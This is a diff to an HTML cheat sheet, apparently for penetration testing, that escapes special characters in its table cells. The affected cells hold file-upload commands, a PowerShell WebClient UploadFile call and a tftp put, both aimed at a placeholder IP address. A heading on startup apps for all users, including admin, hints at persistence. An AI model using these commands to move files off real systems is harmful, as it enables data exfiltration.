@@ -625,7 +625,7 @@
         </tr>
         <tr>
             <td>Upload with Powershell</td>
-            <td>powershell (New-Object System.Net.WebClient).UploadFile('http://<ip address>/<file name>', '<file name>')</td>
+            <td>powershell (New-Object System.Net.WebClient).UploadFile(&#039;http://&lt;ip address&gt;/&lt;file name&gt;&#039;, &#039;&lt;file name&gt;&#039;)</td>
         </tr>
         <tr>
             <td>
@@ -654,7 +654,7 @@
                     </tr>
                     <tr>
                         <td>Upload file from Windows to Linux</td>
-                        <td>tftp -i <ip address> put file.txt</td>
+                        <td>tftp -i &lt;ip address&gt; put file.txt</td>
                     </tr>
                 </table>
             </td>
@@ -695,8 +695,8 @@
         </tr>
     </table>
 
-<h2>Startup Apps</h2>
-<li>Program for startup apps that should start for all users (including admin):</li>
+    <h2>Startup Apps</h2>
+    <li>Program for startup apps that should start for all users (including admin):</li>
 
 
 </body>
